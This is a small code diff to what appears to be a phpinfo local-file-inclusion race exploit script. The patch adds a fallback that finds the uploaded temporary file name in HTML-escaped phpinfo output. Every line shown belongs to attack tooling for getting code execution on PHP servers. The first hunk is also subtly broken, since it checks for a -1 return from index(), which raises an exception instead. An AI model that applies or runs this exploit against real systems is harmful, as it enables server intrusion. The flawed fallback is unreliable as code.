@@ -53,6 +53,8 @@ def phpInfoLFI(host, port, phpinforeq, offset, lfireq, tag):
         d += s.recv(offset)
     try:
         i = d.index("[tmp_name] =>")
+        if i == -1:
+            i = d.index("[tmp_name] =&gt;")
         fn = d[i+17:i+31]
     except ValueError:
         return None
@@ -111,6 +113,8 @@ def getOffset(host, port, phpinforeq):
             break
     s.close()
     i = d.find("[tmp_name] =>")
+    if i == -1:
+        i = d.find("[tmp_name] =&gt;")
     if i == -1:
         raise ValueError("No php tmp_name in phpinfo output")
 
